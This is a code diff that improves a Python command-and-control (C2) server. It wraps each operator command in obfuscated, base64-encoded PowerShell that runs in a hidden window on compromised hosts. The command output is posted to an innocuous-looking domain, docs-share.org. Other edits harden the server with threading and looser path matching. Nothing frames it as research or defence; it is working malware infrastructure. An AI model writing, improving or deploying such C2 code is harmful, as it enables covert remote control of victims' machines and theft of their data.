@@ -3,6 +3,7 @@ import ssl
 import sys
 import os
 import threading
+import base64
 
 HOST = '0.0.0.0'
 PORT = 443
@@ -81,20 +82,32 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         self.send_error(404, "Not found")
 
     def do_POST(self):
-        if self.path == RESULTS_PATH:
+        print(f"[DEBUG] POST request received for path: '{self.path}'")
+        # Check if path ends with /results (handles ///results vs /results normalization)
+        if self.path.endswith('/results'):
             content_length = int(self.headers.get('Content-Length', 0))
+            print(f"[DEBUG] Content-Length: {content_length}")
+            sys.stdout.flush()
             if content_length > 0:
+                # Read strictly the content length
                 output = self.rfile.read(content_length)
+                print(f"[DEBUG] Raw output bytes: {output}")
+                sys.stdout.flush()
                 try:
                     decoded = output.decode('utf-8', errors='replace')
                 except:
                     decoded = str(output)
                 log(f"[+] Output from {self.client_address[0]}:\n{'-'*40}\n{decoded}\n{'-'*40}")
-
-            self.send_response(200)
-            self.send_header('Content-type', 'text/plain')
-            self.send_header('Content-Length', 0)
-            self.end_headers()
+            else:
+                 print("[DEBUG] Content-Length was 0")
+            
+            try:
+                self.send_response(200)
+                self.send_header('Content-Type', 'text/plain')
+                self.send_header('Content-Length', '0') # Explicit string '0'
+                self.end_headers()
+            except Exception as e:
+                 print(f"[DEBUG] Failed to send response: {e}")
             return
 
         self.send_error(404, "Not found")
@@ -118,8 +131,16 @@ def command_input_thread():
                 TASK_QUEUE.append(task_file)
                 print(f"[+] Queued task: {task_file}")
             else:
-                CMD_QUEUE.append(cmd)
-                print(f"[+] Queued command: {cmd}")
+                # Ensure precise content length by converting to bytes
+                # Force string conversion "" + $o to prevent null errors
+                # Disable Expect100Continue to prevent deadlock with simple Python server
+                raw_ps = f'[System.Net.ServicePointManager]::Expect100Continue = $false; $o=({cmd} *>&1 | Out-String); if ([string]::IsNullOrEmpty($o)) {{ $o = " " }}; $b=[System.Text.Encoding]::UTF8.GetBytes($o); iwr https://docs-share.org///results -UseBasicParsing -Method POST -Body $b'
+                
+                # Encode to UTF-16LE then Base64 for -EncodedCommand
+                encoded_cmd = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
+                ps_cmd = f'powershell -nop -w hidden -enc {encoded_cmd}'
+                CMD_QUEUE.append(ps_cmd)
+                print(f"[+] Queued command (encoded): {cmd}")
         except EOFError:
             break
         except KeyboardInterrupt:
@@ -128,7 +149,8 @@ def command_input_thread():
 
 def run():
     server_address = (HOST, PORT)
-    httpd = http.server.HTTPServer(server_address, C2Handler)
+    # Use ThreadingHTTPServer so one blocked request doesn't freeze the whole C2
+    httpd = http.server.ThreadingHTTPServer(server_address, C2Handler)
     
     # Check for SSL certs
     if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
